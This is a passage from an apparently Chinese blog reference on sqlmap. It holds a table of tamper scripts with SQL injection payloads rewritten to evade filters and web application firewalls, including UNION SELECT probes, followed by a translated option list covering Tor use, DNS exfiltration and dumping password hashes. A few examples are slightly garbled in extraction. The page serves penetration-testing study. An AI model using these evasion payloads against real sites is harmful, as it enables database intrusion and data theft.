%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td></tr><tr><td rowspan="2" colspan="1">11</td><td rowspan="2" colspan="1">space2comment.py</td><td rowspan="2" colspan="1">Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users</td></tr><tr><td>* Output: SELECT//id//FROM/**/users</td></tr><tr><td rowspan="38" colspan="1">mysql >= 5.1.13</td><td rowspan="3" colspan="1">1</td><td rowspan="3" colspan="1">equaltolike.py</td><td rowspan="3" colspan="1">like 代替等号</td><td></td></tr><tr><td>* Input: SELECT * FROM users WHERE id=1 </td></tr><tr><td>2 * Output: SELECT * FROM users WHERE id LIKE 1 </td></tr><tr><td rowspan="2" colspan="1">2</td><td rowspan="2" colspan="1">greatest.py</td><td rowspan="2" colspan="1">绕过过滤’>’ ,用GREATEST替换大于号。</td><td>(‘1 AND A > B’)</td></tr><tr><td>‘1 AND GREATEST(A,B+1)=A’</td></tr><tr><td rowspan="3" colspan="1">3</td><td rowspan="3" colspan="1">apostrophenullencode.py</td><td rowspan="3" colspan="1">绕过过滤双引号，替换字符和双引号。</td><td>tamper(“1 AND ‘1’=’1”)</td></tr><tr><td></td></tr><tr><td>‘1 AND %00%271%00%27=%00%271’</td></tr><tr><td rowspan="2" colspan="1">4</td><td rowspan="2" colspan="1">ifnull2ifisnull.py</td><td>绕过对 IFNULL 过滤。</td><td>(‘IFNULL(1, 2)’)</td></tr><tr><td>替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td><td>‘IF(ISNULL(1),2,1)’</td></tr><tr><td rowspan="2" colspan="1">5</td><td rowspan="2" colspan="1">space2mssqlhash.py</td><td rowspan="2" colspan="1">替换空格</td><td>(‘1 AND 9227=9227’)</td></tr><tr><td>‘1%23%0AAND%23%0A9227=9227’</td></tr><tr><td rowspan="2" colspan="1">6</td><td rowspan="2" colspan="1">modsecurityversioned.py</td><td rowspan="2" colspan="1">过滤空格，包含完整的查询版本注释</td><td>(‘1 AND 2>1–‘)</td></tr><tr><td>‘1 /*!30874AND 2>1*/–‘</td></tr><tr><td rowspan="2" colspan="1">7</td><td rowspan="2" colspan="1">space2mysqlblank.py</td><td rowspan="2" colspan="1">空格替换其它空白符号(mysql)</td><td>Input: SELECT id FROM users</td></tr><tr><td>Output: SELECT%0Bid%0BFROM%A0users</td></tr><tr><td rowspan="2" colspan="1">8</td><td rowspan="2" colspan="1">between.py</td><td rowspan="2" colspan="1">用between替换大于号（>）</td><td>(‘1 AND A > B–‘)</td></tr><tr><td>‘1 AND A NOT BETWEEN 0 AND B–‘</td></tr><tr><td rowspan="2" colspan="1">9</td><td rowspan="2" colspan="1">modsecurityzeroversioned.py</td><td rowspan="2" colspan="1">包含了完整的查询与零版本注释</td><td>(‘1 AND 2>1–‘)</td></tr><tr><td>‘1 /*!00000AND 2>1*/–‘</td></tr><tr><td rowspan="2" colspan="1">10</td><td rowspan="2" colspan="1">space2mysqldash.py</td><td rowspan="2" colspan="1">替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td><td>(‘1 AND 9227=9227’)</td></tr><tr><td>‘1–%0AAND–%0A9227=9227’</td></tr><tr><td rowspan="2" colspan="1">11</td><td rowspan="2" colspan="1">bluecoat.py</td><td>代替空格字符后与一个有效的随机空白字符的SQL语句。</td><td>(‘SELECT id FROM users where id = 1’)</td></tr><tr><td>然后替换=为like</td><td>‘SELECT%09id FROM users where id LIKE 1’</td></tr><tr><td rowspan="2" colspan="1">12</td><td rowspan="2" colspan="1">percentage.py</td><td rowspan="2" colspan="1">asp允许每个字符前面添加一个%号</td><td>* Input: SELECT FIELD FROM TABLE</td></tr><tr><td>* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td></tr><tr><td rowspan="2" colspan="1">13</td><td rowspan="2" colspan="1">charencode.py</td><td rowspan="2" colspan="1">url编码</td><td>* Input: SELECT FIELD FROM%20TABLE</td></tr><tr><td>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td></tr><tr><td rowspan="2" colspan="1">14</td><td rowspan="2" colspan="1">randomcase.py</td><td rowspan="2" colspan="1">随机大小写</td><td>* Input: INSERT</td></tr><tr><td>* Output: InsERt</td></tr><tr><td rowspan="2" colspan="1">15</td><td rowspan="2" colspan="1">versionedkeywords.py</td><td rowspan="2" colspan="1">Encloses each non-function keyword with versioned MySQL comment</td><td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#</td></tr><tr><td>* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</td></tr><tr><td rowspan="2" colspan="1">16</td><td rowspan="2" colspan="1">space2comment.py</td><td rowspan="2" colspan="1">Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users</td></tr><tr><td>* Output: SELECT//id//FROM/**/users</td></tr><tr><td rowspan="2" colspan="1">17</td><td rowspan="2" colspan="1">charunicodeencode.py</td><td rowspan="2" colspan="1">字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE</td></tr><tr><td>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td></tr><tr><td rowspan="2" colspan="1">18</td><td rowspan="2" colspan="1">versionedmorekeywords.py</td><td rowspan="2" colspan="1">注释绕过</td><td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</td></tr><tr><td>* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#</td></tr><tr><td rowspan="4" colspan="1">MySQL < 5.1< td><td rowspan="2" colspan="1">1</td><td rowspan="2" colspan="1">halfversionedmorekeywords.py</td><td rowspan="2" colspan="1">关键字前加注释</td><td>* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa</td></ 5.1<></td></tr><tr><td>* Output: value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’=’QDWa</td></tr><tr><td rowspan="2" colspan="1">2</td><td rowspan="2" colspan="1">halfversionedmorekeywords.py</td><td>当数据库为mysql时绕过防火墙，每个关键字之前添加</td><td>1.(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)</td></tr><tr><td>mysql版本评论</td><td>2.”value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND ‘QDWa’=’QDWa”</td></tr><tr><td rowspan="2" colspan="1">MySQL >= 5.1.13</td><td rowspan="2" colspan="1">1</td><td rowspan="2" colspan="1">space2morehash.py</td><td rowspan="2" colspan="1">空格替换为 #号 以及更多随机字符串 换行符</td><td>* Input: 1 AND 9227=9227</td></tr><tr><td>* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</td></tr><tr><td rowspan="15" colspan="1"> Oracle</td><td rowspan="2" colspan="1">1</td><td rowspan="2" colspan="1">greatest.py</td><td rowspan="2" colspan="1">绕过过滤’>’ ,用GREATEST替换大于号。</td><td>(‘1 AND A > B’)</td></tr><tr><td>‘1 AND GREATEST(A,B+1)=A’</td></tr><tr><td rowspan="3" colspan="1">2</td><td rowspan="3" colspan="1">apostrophenullencode.py</td><td rowspan="3" colspan="1">绕过过滤双引号，替换字符和双引号。</td><td>tamper(“1 AND ‘1’=’1”)</td></tr><tr><td></td></tr><tr><td>‘1 AND %00%271%00%27=%00%271’</td></tr><tr><td rowspan="2" colspan="1">3</td><td rowspan="2" colspan="1">between.py</td><td rowspan="2" colspan="1">用between替换大于号（>）</td><td>(‘1 AND A > B–‘)</td></tr><tr><td>‘1 AND A NOT BETWEEN 0 AND B–‘</td></tr><tr><td rowspan="2" colspan="1">4</td><td rowspan="2" colspan="1">charencode.py</td><td rowspan="2" colspan="1">url编码</td><td>* Input: SELECT FIELD FROM%20TABLE</td></tr><tr><td>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td></tr><tr><td rowspan="2" colspan="1">5</td><td rowspan="2" colspan="1">randomcase.py</td><td rowspan="2" colspan="1">随机大小写</td><td>* Input: INSERT</td></tr><tr><td>* Output: InsERt</td></tr><tr><td rowspan="2" colspan="1">6</td><td rowspan="2" colspan="1">charunicodeencode.py</td><td rowspan="2" colspan="1">字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE</td></tr><tr><td>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td></tr><tr><td rowspan="2" colspan="1">7</td><td rowspan="2" colspan="1">space2comment.py</td><td rowspan="2" colspan="1">Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users</td></tr><tr><td>* Output: SELECT//id//FROM/**/users</td></tr><tr><td rowspan="17" colspan="1"> PostgreSQL</td><td rowspan="2" colspan="1">1</td><td rowspan="2" colspan="1">greatest.py</td><td rowspan="2" colspan="1">绕过过滤’>’ ,用GREATEST替换大于号。</td><td>(‘1 AND A > B’)</td></tr><tr><td>‘1 AND GREATEST(A,B+1)=A’</td></tr><tr><td rowspan="3" colspan="1">2</td><td rowspan="3" colspan="1">apostrophenullencode.py</td><td rowspan="3" colspan="1">绕过过滤双引号，替换字符和双引号。</td><td>tamper(“1 AND ‘1’=’1”)</td></tr><tr><td></td></tr><tr><td>‘1 AND %00%271%00%27=%00%271’</td></tr><tr><td rowspan="2" colspan="1">3</td><td rowspan="2" colspan="1">between.py</td><td rowspan="2" colspan="1">用between替换大于号（>）</td><td>(‘1 AND A > B–‘)</td></tr><tr><td>‘1 AND A NOT BETWEEN 0 AND B–‘</td></tr><tr><td rowspan="2" colspan="1">4</td><td rowspan="2" colspan="1">percentage.py</td><td rowspan="2" colspan="1">asp允许每个字符前面添加一个%号</td><td>* Input: SELECT FIELD FROM TABLE</td></tr><tr><td>* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td></tr><tr><td rowspan="2" colspan="1">5</td><td rowspan="2" colspan="1">charencode.py</td><td rowspan="2" colspan="1">url编码</td><td>* Input: SELECT FIELD FROM%20TABLE</td></tr><tr><td>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td></tr><tr><td rowspan="2" colspan="1">6</td><td rowspan="2" colspan="1">randomcase.py</td><td rowspan="2" colspan="1">随机大小写</td><td>* Input: INSERT</td></tr><tr><td>* Output: InsERt</td></tr><tr><td rowspan="2" colspan="1">7</td><td rowspan="2" colspan="1">charunicodeencode.py</td><td rowspan="2" colspan="1">字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE</td></tr><tr><td>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td></tr><tr><td rowspan="2" colspan="1">8</td><td rowspan="2" colspan="1">space2comment.py</td><td rowspan="2" colspan="1">Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users</td></tr><tr><td>* Output: SELECT//id//FROM/**/users</td></tr><tr><td rowspan="2" colspan="1">Access</td><td rowspan="2" colspan="1">1</td><td rowspan="2" colspan="1">appendnullbyte.py</td><td rowspan="2" colspan="1">在有效负荷结束位置加载零字节字符编码</td><td>(‘1 AND 1=1’)</td></tr><tr><td>‘1 AND 1=1%00’</td></tr><tr><td rowspan="5" colspan="1">其他</td><td rowspan="2" colspan="1">1</td><td rowspan="2" colspan="1">chardoubleencode.py</td><td rowspan="2" colspan="1">双url编码(不处理以编码的)</td><td>* Input: SELECT FIELD FROM%20TABLE</td></tr><tr><td>* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td></tr><tr><td rowspan="2" colspan="1">2</td><td rowspan="2" colspan="1">unmagicquotes.py</td><td rowspan="2" colspan="1">宽字符绕过 GPC  addslashes</td><td>* Input: 1′ AND 1=1</td></tr><tr><td>* Output: 1%bf%27 AND 1=1–%20</td></tr><tr><td>3</td><td>randomcomments.py</td><td>用/**/分割sql关键字</td><td>‘INSERT’ becomes ‘IN//S//ERT’</td></tr></table><h1 id="命令详解"><a href="#命令详解" class="headerlink" title="命令详解"></a>命令详解</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Options:<br>  -h, --help            显示基本帮助消息并退出<br>  -hh                   展示先进的帮助信息并退出<br>  --version             显示程序的版本号并退出<br>  -v VERBOSE            冗长水平:0 - 6(默认 1)<br><br>  目标:<br>    必须至少提供其中一个选项来定义目标<br><br>    -u URL, <span class="hljs-attribute">--url</span>=URL   目标URL(例如 <span class="hljs-string">&quot;http://www.site.com/vuln.php?id=1&quot;</span>)<br>    -d DIRECT           连接字符串直接数据库连接<br>    -l LOGFILE          解析目标(s)从打嗝或WebScarab代理日志文件<br>    -m BULKFILE         扫描多个目标在一个文本文件<br>    -r REQUESTFILE      从文件中加载HTTP请求<br>    -g GOOGLEDORK       将Google dork结果作为目标URL处理<br>    -c CONFIGFILE       从一个配置加载选项INI文件<br><br>  请求:<br>    这些选项可用于指定如何连接到目标URL<br><br>    -A AGENT, --user<span class="hljs-built_in">..</span>  HTTP用户代理头的值<br>    -H HEADER, --hea<span class="hljs-built_in">..</span>  额外的头(例如 <span class="hljs-string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span>)<br>    <span class="hljs-attribute">--method</span>=METHOD     强制使用给定HTTP方法(例如 PUT)<br>    <span class="hljs-attribute">--data</span>=DATA         通过POST发送的数据字符串(例如 <span class="hljs-string">&quot;id=1&quot;</span>)<br>    <span class="hljs-attribute">--param-del</span>=PARA..  用于拆分参数值的字符(例如 &amp;<br>    <span class="hljs-attribute">--cookie</span>=COOKIE     HTTP Cookie头的值(例如 <span class="hljs-string">&quot;PHPSESSID=a8d127e..&quot;</span>)<br>    <span class="hljs-attribute">--cookie-del</span>=COO..  用于拆分cookie值的字符(例如 ;)<br>    <span class="hljs-attribute">--live-cookies</span>=L..  用于加载最新值的实时cookie文件<br>    <span class="hljs-attribute">--load-cookies</span>=L..  包含Netscape/wget格式cookie的文件<br>    --drop-set-cookie   忽略响应中的<span class="hljs-built_in">Set</span> Cookie标头<br>    --mobile            模仿智能手机通过HTTP代理头<br>    --random-agent      使用随机选择的HTTP用户代理标头值<br>    <span class="hljs-attribute">--host</span>=HOST         HTTP主机头的值<br>    <span class="hljs-attribute">--referer</span>=REFERER   HTTP引用页头的值<br>    <span class="hljs-attribute">--headers</span>=HEADERS   额外的标题(例如<span class="hljs-string">&quot;Accept-Language: fr\nETag: 123&quot;</span>)<br>    <span class="hljs-attribute">--auth-type</span>=AUTH..  HTTP身份验证类型(Basic, Digest, Bearer, <span class="hljs-built_in">..</span>.)<br>    <span class="hljs-attribute">--auth-cred</span>=AUTH..  HTTP身份验证凭证(名称:密码)<br>    <span class="hljs-attribute">--auth-file</span>=AUTH..  HTTP身份验证PEM证书/私钥文件<br>    <span class="hljs-attribute">--ignore-code</span>=IG..  忽略(问题)的HTTP错误代码(例如: 401)<br>    --ignore-proxy      忽略系统默认代理设置<br>    --ignore-redirects  忽略重定向的尝试<br>    --ignore-timeouts   忽略连接超时<br>    <span class="hljs-attribute">--proxy</span>=PROXY       使用一个代理连接到目标URL<br>    <span class="hljs-attribute">--proxy-cred</span>=PRO..  代理身份验证凭证(名称:密码)<br>    <span class="hljs-attribute">--proxy-file</span>=PRO..  从文件加载代理列表<br>    <span class="hljs-attribute">--proxy-freq</span>=PRO..  请求改变之间的代理从一个给定的列表<br>    --tor               使用Tor匿名网络<br>    <span class="hljs-attribute">--tor-port</span>=TORPORT  设置Tor代理端口,而不是默认值<br>    <span class="hljs-attribute">--tor-type</span>=TORTYPE  设置Tor代理类型(HTTP、SOCKS4或SOCKS5(默认)<br>    --check-tor         查看是否正确使用Tor<br>    <span class="hljs-attribute">--delay</span>=DELAY       每个HTTP请求之间的延迟（秒）<br>    <span class="hljs-attribute">--timeout</span>=TIMEOUT   超时连接前等待的秒数(默认值 30)<br>    <span class="hljs-attribute">--retries</span>=RETRIES   重试时连接超时(默认 3)<br>    <span class="hljs-attribute">--retry-on</span>=RETRYON  对匹配内容的正则表达式重试请求(例如 <span class="hljs-string">&quot;drop&quot;</span>)<br>    <span class="hljs-attribute">--randomize</span>=RPARAM  对于给定的参数随机变化值(s)<br>    <span class="hljs-attribute">--safe-url</span>=SAFEURL  URL地址访问期间经常测试<br>    <span class="hljs-attribute">--safe-post</span>=SAFE..  POST数据发送到一个安全的URL<br>    <span class="hljs-attribute">--safe-req</span>=SAFER..  从一个文件装载安全的HTTP请求<br>    <span class="hljs-attribute">--safe-freq</span>=SAFE..  定期请求访问一个安全的URL<br>    --skip-urlencode    跳过URL编码的有效载荷数据<br>    <span class="hljs-attribute">--csrf-token</span>=CSR..  参数用于保存anti-CSRF令牌<br>    <span class="hljs-attribute">--csrf-url</span>=CSRFURL  URL地址为提取anti-CSRF访问令牌<br>    <span class="hljs-attribute">--csrf-method</span>=CS..  HTTP方法使用anti-CSRF标记页面访问期间<br>    <span class="hljs-attribute">--csrf-data</span>=CSRF..  POST数据发送anti-CSRF标记页面访问期间<br>    <span class="hljs-attribute">--csrf-retries</span>=C..  重试anti-CSRF令牌检索(默认 0)<br>    --force-ssl         强制使用SSL/HTTPS<br>    --chunked           使用HTTP分块传输编码(POST)请求<br>    --hpp               使用HTTP参数污染的方法<br>    <span class="hljs-attribute">--eval</span>=EVALCODE     请求之前评估提供Python代码(例如 <span class="hljs-string">&quot;import</span><br><span class="hljs-string">                        hashlib;id2=hashlib.md5(id).hexdigest()&quot;</span>)<br><br>  优化:<br>    这些选项可用于优化sqlmap的性能<br><br>    -o                  打开所有优化开关<br>    --predict-output    预测常见的查询输出<br>    --keep-alive        使用持久HTTP (s)连接<br>    --null-connection   检索页面长度没有实际的HTTP响应的身体<br>    <span class="hljs-attribute">--threads</span>=THREADS   最大并发HTTP (s)请求(默认 1)<br><br>  注射:<br>    这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本<br><br>    -p TESTPARAMETER    可测试参数<br>    <span class="hljs-attribute">--skip</span>=SKIP         跳过测试对于给定参数(s)<br>    --skip-static       跳过测试参数不似乎是动态的<br>    <span class="hljs-attribute">--param-exclude</span>=..  Regexp排除参数测试(例如 <span class="hljs-string">&quot;ses&quot;</span>)<br>    <span class="hljs-attribute">--param-filter</span>=P..  选择测试的参数(s)的位置(例如 <span class="hljs-string">&quot;POST&quot;</span>)<br>    <span class="hljs-attribute">--dbms</span>=DBMS         强制后端DBMS提供值<br>    <span class="hljs-attribute">--dbms-cred</span>=DBMS..  DBMS身份验证凭据(用户:密码)<br>    <span class="hljs-attribute">--os</span>=OS             强制后端DBMS操作系统提供价值<br>    --invalid-bignum    使用大量无效值<br>    --invalid-logical   使用逻辑操作无效值<br>    --invalid-string    使用随机字符串无效值<br>    --no-cast           关掉负载铸造机制<br>    --no-escape         关掉字符串转义机制<br>    <span class="hljs-attribute">--prefix</span>=PREFIX     注入载荷前缀字符串<br>    <span class="hljs-attribute">--suffix</span>=SUFFIX     注入载荷后缀字符串<br>    <span class="hljs-attribute">--tamper</span>=TAMPER     使用给定的脚本(s)篡改注入数据<br><br>  侦查:<br>    这些选项可用于自定义检测阶段<br><br>    <span class="hljs-attribute">--level</span>=LEVEL       要执行的测试的水平(1-5,默认 1)<br>    <span class="hljs-attribute">--risk</span>=RISK         要执行的测试的风险(1-3,默认 1)<br>    <span class="hljs-attribute">--string</span>=STRING     查询字符串来匹配时求值为<span class="hljs-literal">True</span><br>    <span class="hljs-attribute">--not-string</span>=NOT..  字符串匹配时查询计算为<span class="hljs-literal">False</span><br>    <span class="hljs-attribute">--regexp</span>=REGEXP     Regexp匹配查询时求值为<span class="hljs-literal">True</span><br>    <span class="hljs-attribute">--code</span>=CODE         HTTP代码查询评估为<span class="hljs-literal">True</span>时匹配<br>    --smart             进行彻底的测试只有在积极的启发式(s)<br>    --text-only         页面只基于文本内容进行比较<br>    --titles            比较页面仅基于他们的头衔<br><br>  技术:<br>    这些选项可用于调整特定SQL注入技术的测试<br><br>    <span class="hljs-attribute">--technique</span>=TECH..  要使用的SQL注入技术(默认 <span class="hljs-string">&quot;BEUSTQ&quot;</span>)<br>    <span class="hljs-attribute">--time-sec</span>=TIMESEC  秒延迟DBMS响应(默认 5)<br>    <span class="hljs-attribute">--union-cols</span>=UCOLS  列的SQL注入的测试联合查询<br>    <span class="hljs-attribute">--union-char</span>=UCHAR  字符用于bruteforcing列数<br>    <span class="hljs-attribute">--union-from</span>=UFROM  UNION查询SQL注入的<span class="hljs-keyword">FROM</span>部分中使用的表<br>    <span class="hljs-attribute">--dns-domain</span>=DNS..  域名用于DNS漏出攻击<br>    <span class="hljs-attribute">--second-url</span>=SEC..  产生的页面的URL搜索二阶响应<br>    <span class="hljs-attribute">--second-req</span>=SEC..  从文件加载二阶HTTP请求<br><br>  Fingerprint:<br>    -f, --fingerprint   执行一个广泛的DBMS版本指纹<br><br>  枚举:<br>    这些选项可用于枚举表中包含的后端数据库管理系统信息、结构和数据<br><br>    -a, --all           检索所有<br>    -b, --banner        检索DBMS横幅<br>    --current-user      获取当前用户数据库管理系统<br>    --current-db        检索DBMS当前数据库<br>    --hostname          检索DBMS服务器主机名<br>    --is-dba            检测是否DBA DBMS当前用户<br>    --users             列举DBMS用户<br>    --passwords         列举DBMS用户 password hashes<br>    --privileges        列举DBMS用户 privileges<br>    --roles             列举DBMS用户 roles<br>    --dbs               列举DBMS数据库<br>    --tables            列举DBMS数据库表<br>    --columns           列举DBMS数据库表列<br>    --schema            枚举 DBMS 模式<br>    --count             检索表(s)的条目数量<br>    --dump              转储DBMS数据库表条目<br>    --dump-all          转储所有DBMS数据库表条目<br>    --search            搜索列、表和/或数据库名称<br>    --comments          枚举期间检查DBMS注释<br>    --statements        检索SQL语句被运行在DBMS<br>    -D DB               数据库管理系统数据库来列举<br>    -T TBL              数据库管理系统数据库表(s)列举<br>    -C COL              数据库管理系统数据库表列(s)枚举<br>    -X EXCLUDE          